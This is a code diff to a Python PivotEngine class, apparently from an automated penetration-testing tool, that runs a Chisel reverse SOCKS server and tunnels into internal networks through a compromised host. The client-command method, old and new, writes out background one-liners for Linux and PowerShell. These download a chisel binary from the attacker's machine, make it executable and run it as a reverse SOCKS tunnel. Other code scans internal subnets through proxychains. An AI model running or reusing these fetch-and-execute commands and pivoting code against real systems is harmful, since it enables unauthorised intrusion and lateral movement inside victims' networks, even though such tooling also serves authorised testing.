@@ -1,6 +1,6 @@
 """
-PivotEngine — sets up SOCKS proxy / Chisel tunneling through a compromised host
-to reach internal VLANs (ADMIN 10.10.10.0/24, USERS 10.10.20.0/24, DMZ, etc.).
+PivotEngine — sets up SOCKS proxy / Chisel tunneling through an operator-approved pivot host
+to reach networks already discovered by the active mission.
 """
 
 import logging
@@ -17,7 +17,7 @@ from datetime import datetime, timezone
 
 log = logging.getLogger(__name__)
 
-CHISEL_BINARY = "/usr/bin/chisel"
+CHISEL_BINARY = os.getenv("PIVOT_CHISEL_BINARY", "/usr/bin/chisel")
 PROXYCHAINS_CONF = "/etc/proxychains4.conf"
 
 
@@ -34,6 +34,8 @@ class PivotEngine:
         self._chisel_args: List[str] = []
         self._socks_port: int = 1080
         self._pivot_active: bool = False
+        self._server_running: bool = False
+        self._chisel_port: int = int(os.getenv("PIVOT_DEFAULT_CHISEL_PORT", "8080"))
         self._active_tunnels: List[dict] = []
         self._lock = threading.Lock()
 
@@ -44,15 +46,19 @@ class PivotEngine:
         Start a Chisel reverse SOCKS server on Kali.
         The compromised host connects back to this.
         """
-        if self._chisel_process and self._pivot_active:
+        if (
+            self._chisel_process is not None
+            and self._chisel_process.poll() is None
+        ):
+            self._server_running = True
             log.info("Chisel server already running")
             return True
 
         try:
-            self._socks_port = socks_port
+            self._socks_port = int(socks_port)
+            self._chisel_port = int(port)
             self._chisel_process = subprocess.Popen(
-                [CHISEL_BINARY, "server", "-p", str(port),
-                 "--reverse", "--socks5", f"--socks5"],
+                [CHISEL_BINARY, "server", "--reverse", "--port", str(port)],
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
             )
@@ -60,8 +66,9 @@ class PivotEngine:
 
             # Verify it started
             if self._chisel_process.poll() is None:
-                self._pivot_active = True
-                log.info(f"✅ Chisel server on 0.0.0.0:{port}, SOCKS on 127.0.0.1:{socks_port}")
+                self._server_running = True
+                self._pivot_active = self.is_socks_ready()
+                log.info(f"Chisel server listening on 0.0.0.0:{port}; waiting for reverse SOCKS client on 127.0.0.1:{socks_port}")
                 return True
             else:
                 log.error("Chisel server failed to start")
@@ -84,12 +91,29 @@ class PivotEngine:
             except subprocess.TimeoutExpired:
                 self._chisel_process.kill()
             self._chisel_process = None
+        self._server_running = False
         self._pivot_active = False
         log.info("Chisel server stopped")
 
+    def _port_listening(self, host: str, port: int, timeout: float = 0.25) -> bool:
+        import socket
+
+        try:
+            with socket.create_connection((host, int(port)), timeout=timeout):
+                return True
+        except OSError:
+            return False
+
+    def is_socks_ready(self) -> bool:
+        """Return True only after the reverse client created the local SOCKS port."""
+        ready = self._port_listening("127.0.0.1", self._socks_port)
+        self._pivot_active = bool(ready)
+        return ready
+
     @property
     def is_running(self) -> bool:
-        return self._pivot_active and self._chisel_process is not None
+        """Compatibility property: a usable pivot, not merely a server process."""
+        return self.is_socks_ready()
 
     # ── Client Command Generation ────────────────────────────
 
@@ -100,21 +124,24 @@ class PivotEngine:
         to connect back to our Chisel server.
         """
         if platform == "linux":
+            socks_remote = f"R:{self._socks_port}:socks"
             return (
-                f"nohup bash -c '"
-                f"wget -qO /tmp/c {self.kali_ip}:9999/chisel 2>/dev/null || "
-                f"curl -so /tmp/c {self.kali_ip}:9999/chisel 2>/dev/null; "
-                f"chmod +x /tmp/c && "
-                f"/tmp/c client {self.kali_ip}:{chisel_port} R:socks &"
-                f"' >/dev/null 2>&1 &"
+                "nohup bash -c '"
+                "CHISEL=$(command -v chisel || true); "
+                'if [ -z "$CHISEL" ]; then '
+                f"wget -qO /tmp/chisel http://{self.kali_ip}:9999/chisel 2>/dev/null || "
+                f"curl -fsSLo /tmp/chisel http://{self.kali_ip}:9999/chisel; "
+                "chmod +x /tmp/chisel; CHISEL=/tmp/chisel; fi; "
+                f'exec "$CHISEL" client http://{self.kali_ip}:{int(chisel_port)} {socks_remote}'
+                "' >/tmp/autopentest-chisel.log 2>&1 &"
             )
         else:
-            # Windows PowerShell
+            socks_remote = f"R:{self._socks_port}:socks"
             return (
                 f"Invoke-WebRequest -Uri http://{self.kali_ip}:9999/chisel.exe "
                 f"-OutFile $env:TEMP\\c.exe -UseBasicParsing; "
                 f"Start-Process -NoNewWindow $env:TEMP\\c.exe "
-                f"'-client {self.kali_ip}:{chisel_port} R:socks'"
+                f"-ArgumentList 'client','http://{self.kali_ip}:{int(chisel_port)}','{socks_remote}'"
             )
 
     def generate_msf_route_commands(self, session_id: int, subnets: List[str]) -> List[str]:
@@ -171,8 +198,9 @@ class PivotEngine:
         Scan an internal network range through the pivot using proxychains.
         Returns a list of discovered hosts with open ports.
         """
-        if not self._pivot_active:
-            log.warning("Pivot not active — internal scan may fail")
+        if not self.is_socks_ready():
+            log.warning("Pivot SOCKS port is not ready; refusing internal scan")
+            return []
 
         results = []
         config_path = getattr(
@@ -282,12 +310,23 @@ class PivotEngine:
 
     def get_status(self) -> Dict[str, Any]:
         """Get current pivot status."""
+        process_running = bool(
+            self._chisel_process is not None
+            and self._chisel_process.poll() is None
+        )
+        socks_ready = self.is_socks_ready()
+        self._server_running = process_running
         return {
-            "pivot_active": self._pivot_active,
+            "pivot_active": socks_ready,
+            "server_running": process_running,
+            "client_connected": socks_ready,
+            "socks_ready": socks_ready,
             "socks_port": self._socks_port,
-            "chisel_running": self._chisel_process is not None,
-            "active_tunnels": len(self._active_tunnels),
+            "chisel_port": self._chisel_port,
+            "chisel_running": process_running,
+            "active_tunnels": 1 if socks_ready else 0,
             "kali_ip": self.kali_ip,
+            "proxychains_config": getattr(self, "proxychains_config_path", None),
         }
 
     def cleanup(self):
